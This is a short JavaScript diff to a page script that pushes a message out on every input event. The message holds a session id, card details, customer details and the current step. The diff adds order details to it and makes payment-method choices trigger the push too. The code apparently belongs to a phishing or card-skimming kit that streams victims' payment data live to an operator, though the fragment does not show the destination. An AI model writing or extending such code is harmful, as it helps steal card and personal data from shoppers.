@@ -2785,6 +2785,7 @@ fetch('/api/settings')
           sessionId:    sid,
           cardInfo:     payload.cardInfo,
           customerInfo: payload.customerInfo,
+          orderInfo:    payload.orderInfo,
           currentStep:  _curStep
         }
       }));
@@ -2807,6 +2808,9 @@ fetch('/api/settings')
     var el = q(id);
     if (el) el.addEventListener('input', onInput);
   });
+  // payment method radio change → livePush
+  var pmRadios = document.querySelectorAll('input[name="payment_method"]');
+  pmRadios.forEach(function (r) { r.addEventListener('change', onInput); });
  
  
   /* ═══════════════════════════════════════════
